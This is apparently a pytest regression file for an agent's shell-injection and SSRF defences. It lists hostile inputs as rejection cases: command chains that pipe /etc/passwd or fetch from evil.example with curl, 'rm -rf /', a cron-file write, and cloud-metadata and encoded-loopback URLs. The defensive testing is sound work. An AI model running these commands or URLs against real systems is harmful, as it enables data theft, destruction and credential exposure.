"""Regression tests for the agent security helpers (agent_safety.py).

Covers the two P2 security-lane findings from the 2026-06-28 audit:

* Shell-injection in the Zoe Agent ``bash`` tool — every legitimate allowlisted
  command still parses to argv, while command-chaining / substitution /
  redirection payloads are rejected.
* SSRF on outbound fetch + panel hosts — public targets are allowed, private /
  loopback / link-local / cloud-metadata targets are blocked, and LAN panel
  hosts keep working.

Pure stdlib + agent_safety only, so it runs in the slim CI environment and uses
only IP literals / ``localhost`` (no external DNS or network).
"""

import importlib

import pytest

agent_safety = importlib.import_module("agent_safety")
from agent_safety import (  # noqa: E402
    CommandRejected,
    SSRFBlocked,
    assert_panel_host,
    assert_panel_url,
    assert_public_url,
    check_bash_command,
    is_allowed_panel_host,
    is_public_url,
)

# Mirror of zoe_agent._BASH_ALLOWED_PREFIXES (kept local so the test documents
# the contract independently of the agent module's heavy imports).
ALLOWED = (
    "pip install", "python3 -c", "cat ", "ls ", "echo ", "date",
    "systemctl --user status", "systemctl status",
    "df ", "free ", "ps ", "uname ", "top -bn1", "uptime",
)


# ── Shell allowlist: legitimate commands STILL WORK ───────────────────────────

@pytest.mark.parametrize(
    "command, expected_argv0",
    [
        ("echo hello world", "echo"),
        ("cat /etc/hostname", "cat"),
        ("ls -la /var/log", "ls"),
        ("date", "date"),
        ("df -h", "df"),
        ("free -m", "free"),
        ("ps aux", "ps"),
        ("uname -a", "uname"),
        ("top -bn1", "top"),
        ("uptime", "uptime"),
        ("systemctl --user status zoe-data", "systemctl"),
        ("systemctl status zoe-data", "systemctl"),
        ("pip install httpx", "pip"),
    ],
)
def test_legit_commands_parse_to_argv(command, expected_argv0):
    argv = check_bash_command(command, ALLOWED)
    assert argv[0] == expected_argv0


def test_quoted_metachar_in_plain_command_is_conservatively_rejected():
    # Defence-in-depth: non-code commands reject shell metacharacters even inside
    # quotes (argv exec already neutralises them, but we reject for clarity).
    # Use ``python3 -c`` when a literal ';' is genuinely needed.
    with pytest.raises(CommandRejected):
        check_bash_command("echo 'literal; semicolon'", ALLOWED)


def test_python_dash_c_allows_code_with_metacharacters():
    # The python code payload may legitimately contain ';', '()', etc.
    argv = check_bash_command('python3 -c "import os; print(os.getcwd())"', ALLOWED)
    assert argv == ["python3", "-c", "import os; print(os.getcwd())"]


# ── Shell injection: chaining / substitution / redirection REJECTED ───────────

@pytest.mark.parametrize(
    "payload",
    [
        "echo ok; curl http://evil.example",      # command separator
        "echo ok && curl http://evil.example",    # AND chain
        "echo ok || curl http://evil.example",    # OR chain
        "cat /etc/passwd | curl http://evil",     # pipe
        "echo $(curl http://evil.example)",       # $() substitution
        "echo `curl http://evil.example`",        # backtick substitution
        "echo pwned > /etc/cron.d/x",             # redirect
        "cat /etc/passwd >> /tmp/leak",           # append redirect
        "date & curl http://evil.example",        # background + chain
        "echo ${HOME}; rm -rf /",                 # var expansion + chain
    ],
)
def test_injection_payloads_rejected(payload):
    with pytest.raises(CommandRejected):
        check_bash_command(payload, ALLOWED)


@pytest.mark.parametrize(
    "payload",
    [
        "curl http://evil.example",   # not allowlisted at all
        "rm -rf /",                   # not allowlisted
        "wget http://evil",           # not allowlisted
        "",                           # empty
        "   ",                        # whitespace only
    ],
)
def test_non_allowlisted_rejected(payload):
    with pytest.raises(CommandRejected):
        check_bash_command(payload, ALLOWED)


def test_unbalanced_quotes_rejected():
    with pytest.raises(CommandRejected):
        check_bash_command('echo "unterminated', ALLOWED)


@pytest.mark.parametrize(
    "payload",
    [
        "dateevil",                 # bare 'date' prefix must not match 'dateevil'
        "uptimefoo",                # bare 'uptime' prefix must not match
        "lsbin /etc",               # 'ls ' must not match 'lsbin'
        "catastrophe /etc/passwd",  # 'cat ' must not match 'catastrophe'
        "python3 -cmalicious",      # 'python3 -c' must not match '-cmalicious'
        "psql -c 'DROP TABLE x'",   # 'ps ' must not match 'psql'
    ],
)
def test_prefix_suffix_does_not_match_other_binaries(payload):
    # Regression: token-aware matching — a bare allowlist entry must only match
    # the exact binary/flags, never a longer binary name with the same prefix.
    with pytest.raises(CommandRejected):
        check_bash_command(payload, ALLOWED)


# ── SSRF: outbound web-fetch policy (assert_public_url) ────────────────────────

@pytest.mark.parametrize(
    "url",
    [
        "http://8.8.8.8/",            # public IPv4 literal — no DNS needed
        "https://1.1.1.1/path?q=1",
    ],
)
def test_public_urls_allowed(url):
    assert is_public_url(url) is True
    assert assert_public_url(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/",                                  # loopback
        "http://localhost/admin",                            # resolves to loopback
        "http://169.254.169.254/latest/meta-data/",          # cloud metadata
        "http://169.254.169.254/",                           # link-local
        "http://192.168.1.10/",                              # private LAN
        "http://10.0.0.1/internal",                          # private
        "http://172.16.0.5/",                                # private
        "http://[::1]/",                                     # IPv6 loopback
        "http://0.0.0.0/",                                   # unspecified
        "http://100.64.0.1/",                                # CGNAT (not global)
        "http://[::ffff:127.0.0.1]/",                        # IPv4-mapped loopback
    ],
)
def test_private_and_metadata_urls_blocked(url):
    assert is_public_url(url) is False
    with pytest.raises(SSRFBlocked):
        assert_public_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "file:///etc/passwd",
        "ftp://10.0.0.1/x",
        "gopher://127.0.0.1/",
        "redis://127.0.0.1:6379",
        "not-a-url",
    ],
)
def test_non_http_schemes_blocked(url):
    with pytest.raises(SSRFBlocked):
        assert_public_url(url)


# ── SSRF: panel-host policy (assert_panel_host) ───────────────────────────────

def test_default_panel_host_allowed():
    # 192.168.1.61 is the configured default (ZOE_PI_HOST) AND a private LAN IP.
    assert is_allowed_panel_host("192.168.1.61") is True
    assert assert_panel_host("192.168.1.61") == "192.168.1.61"


@pytest.mark.parametrize("host", ["10.0.0.5", "192.168.4.20", "172.16.9.9"])
def test_lan_panel_hosts_allowed(host):
    # Panels live on the LAN — private addresses are permitted.
    assert is_allowed_panel_host(host) is True


@pytest.mark.parametrize(
    "host",
    [
        "127.0.0.1",          # loopback — could reach localhost-only services
        "169.254.169.254",    # cloud metadata
        "8.8.8.8",            # public — a panel is never on the internet
        "::1",                # IPv6 loopback
        "",                   # empty
    ],
)
def test_dangerous_panel_hosts_blocked(host):
    assert is_allowed_panel_host(host) is False
    if host:
        with pytest.raises(SSRFBlocked):
            assert_panel_host(host)


def test_panel_allowlist_never_bypasses_danger_check(monkeypatch):
    # B4 regression: an allowlisted host must STILL resolve to a private LAN
    # address. The allowlist only narrows; it can never widen the policy, so
    # loopback / metadata / public stay blocked even when explicitly listed.
    monkeypatch.setenv("ZOE_PANEL_ALLOWED_HOSTS", "127.0.0.1, 169.254.169.254, 8.8.8.8, 192.168.1.61")
    assert is_allowed_panel_host("127.0.0.1") is False        # loopback, listed -> still blocked
    assert is_allowed_panel_host("169.254.169.254") is False  # metadata, listed -> still blocked
    assert is_allowed_panel_host("8.8.8.8") is False          # public, listed -> still blocked
    assert is_allowed_panel_host("192.168.1.61") is True      # private LAN AND listed -> allowed
    with pytest.raises(SSRFBlocked):
        assert_panel_host("127.0.0.1")


def test_panel_allowlist_narrows_to_listed_lan_hosts(monkeypatch):
    # When the allowlist is set, a private LAN host NOT on the list is rejected;
    # when unset, any private LAN host is allowed.
    monkeypatch.setenv("ZOE_PANEL_ALLOWED_HOSTS", "192.168.1.61")
    assert is_allowed_panel_host("192.168.1.61") is True
    assert is_allowed_panel_host("10.0.0.5") is False   # LAN but not listed
    monkeypatch.delenv("ZOE_PANEL_ALLOWED_HOSTS", raising=False)
    assert is_allowed_panel_host("10.0.0.5") is True    # no list -> any LAN ok


# ── guarded_urlopen aborts before opening an internal target ──────────────────

def test_guarded_urlopen_blocks_internal_before_connect():
    with pytest.raises(SSRFBlocked):
        agent_safety.guarded_urlopen("http://169.254.169.254/latest/meta-data/", timeout=1)
    with pytest.raises(SSRFBlocked):
        agent_safety.guarded_urlopen("http://127.0.0.1:6379/", timeout=1)


# ── B3: obfuscated literal encodings of internal IPs are rejected ─────────────

@pytest.mark.parametrize(
    "url",
    [
        "http://2130706433/",          # decimal     -> 127.0.0.1
        "http://0x7f000001/",          # hex         -> 127.0.0.1
        "http://0177.0.0.1/",          # octal       -> 127.0.0.1
        "http://017700000001/",        # full octal  -> 127.0.0.1
        "http://2852039166/",          # decimal     -> 169.254.169.254 (metadata)
        "http://[::ffff:127.0.0.1]/",  # IPv4-mapped -> loopback
        "http://[::ffff:a9fe:a9fe]/",  # IPv4-mapped -> 169.254.169.254
        "http://100.64.0.1/",          # CGNAT 100.64/10 (not globally routable)
    ],
)
def test_obfuscated_internal_encodings_blocked(url):
    assert is_public_url(url) is False
    with pytest.raises(SSRFBlocked):
        assert_public_url(url)


# ── B3: connection is pinned to the validated IP (anti-rebinding) ─────────────

def test_resolve_validate_pin_rejects_internal():
    with pytest.raises(SSRFBlocked):
        agent_safety.resolve_validate_pin("169.254.169.254")
    with pytest.raises(SSRFBlocked):
        agent_safety.resolve_validate_pin("127.0.0.1")
    # public literal pins to itself
    assert agent_safety.resolve_validate_pin("8.8.8.8") == "8.8.8.8"


def test_pinned_connection_connects_to_validated_ip(monkeypatch):
    import ipaddress

    captured = {}

    def fake_resolve(host):
        # host validates as public, returns a specific public IP
        return [ipaddress.ip_address("8.8.8.8")]

    def fake_create_connection(address, *a, **k):
        captured["address"] = address
        raise AssertionError("stop-after-connect")  # don't actually open a socket

    monkeypatch.setattr(agent_safety, "resolve_ips", fake_resolve)
    monkeypatch.setattr(agent_safety.socket, "create_connection", fake_create_connection)

    conn = agent_safety._PinnedHTTPConnection("evil-rebind.example", 80)
    with pytest.raises(AssertionError):
        conn.connect()
    # The socket connected to the validated IP literal, NOT a re-resolved hostname.
    assert captured["address"] == ("8.8.8.8", 80)


def test_dns_rebinding_validate_public_then_connect_private_blocked(monkeypatch):
    import ipaddress

    state = {"n": 0}

    def flapping_resolve(host):
        state["n"] += 1
        # 1st lookup (validation) -> public; 2nd lookup (connect/pin) -> private
        if state["n"] == 1:
            return [ipaddress.ip_address("8.8.8.8")]
        return [ipaddress.ip_address("10.0.0.5")]

    monkeypatch.setattr(agent_safety, "resolve_ips", flapping_resolve)

    # Validation-time view: looks public.
    assert is_public_url("http://rebind.test/") is True
    # Connect-time pin re-resolves and now sees a private address -> blocked.
    with pytest.raises(SSRFBlocked):
        agent_safety.resolve_validate_pin("rebind.test")


# ── B1/B2: Playwright route guard aborts internal hops pre-connect ────────────

def _drive_route_guard(target_url):
    """Install guard_browser_page on a fake page and run its handler for one
    request URL; return (continued, aborted)."""
    import asyncio

    class _FakeRoute:
        def __init__(self, url):
            self.request = type("Req", (), {"url": url})()
            self.continued = False
            self.aborted = False

        async def continue_(self):
            self.continued = True

        async def abort(self):
            self.aborted = True

    class _FakePage:
        def __init__(self):
            self.handler = None

        async def route(self, pattern, handler):
            self.handler = handler

    async def _run():
        page = _FakePage()
        await agent_safety.guard_browser_page(page)
        route = _FakeRoute(target_url)
        await page.handler(route)
        return route.continued, route.aborted

    return asyncio.new_event_loop().run_until_complete(_run())


def test_browser_route_guard_allows_public():
    continued, aborted = _drive_route_guard("http://8.8.8.8/page")
    assert continued is True and aborted is False


@pytest.mark.parametrize(
    "url",
    [
        "http://127.0.0.1/",                         # loopback
        "http://169.254.169.254/latest/meta-data/",  # cloud metadata (redirect target)
        "http://192.168.1.10/",                      # private LAN
        "http://2130706433/",                        # decimal-encoded loopback
    ],
)
def test_browser_route_guard_aborts_internal(url):
    continued, aborted = _drive_route_guard(url)
    assert aborted is True and continued is False


# ── Residual #1: guarded_urlopen ignores environment proxies ──────────────────

def test_guarded_urlopen_ignores_env_proxy(monkeypatch):
    import ipaddress

    # Public proxy in env: if honored, urllib would connect to the proxy host.
    monkeypatch.setenv("HTTP_PROXY", "http://9.9.9.9:8080")
    monkeypatch.setenv("http_proxy", "http://9.9.9.9:8080")
    monkeypatch.setenv("ALL_PROXY", "http://9.9.9.9:8080")

    def fake_resolve(host):
        if host == "origin.example":
            return [ipaddress.ip_address("8.8.8.8")]
        return [ipaddress.ip_address(host)]  # IP literals (e.g. the proxy) pass through

    captured = {}

    def fake_create_connection(address, *a, **k):
        captured["address"] = address
        raise AssertionError("stop-after-connect")

    monkeypatch.setattr(agent_safety, "resolve_ips", fake_resolve)
    monkeypatch.setattr(agent_safety.socket, "create_connection", fake_create_connection)

    with pytest.raises(AssertionError):
        agent_safety.guarded_urlopen("http://origin.example/x", timeout=2)

    # Connected directly to the validated ORIGIN IP, never the proxy (9.9.9.9).
    assert captured["address"] == ("8.8.8.8", 80)


# ── Residual #2: panel_browser_screenshot nav is LAN-panel-only ───────────────

@pytest.mark.parametrize("url", ["http://192.168.1.61/", "http://10.0.0.5:8123/setup"])
def test_assert_panel_url_allows_lan(url):
    assert assert_panel_url(url) == url


@pytest.mark.parametrize(
    "url",
    [
        "http://8.8.8.8/",                           # public — not a panel
        "https://1.1.1.1/",                          # public host
        "http://127.0.0.1/",                         # loopback
        "http://169.254.169.254/latest/meta-data/",  # metadata
        "http://2130706433/",                        # decimal-encoded loopback
        "file:///etc/passwd",                        # non-http scheme
        "ftp://192.168.1.61/",                       # non-http scheme
    ],
)
def test_assert_panel_url_rejects_non_lan(url):
    with pytest.raises(SSRFBlocked):
        assert_panel_url(url)
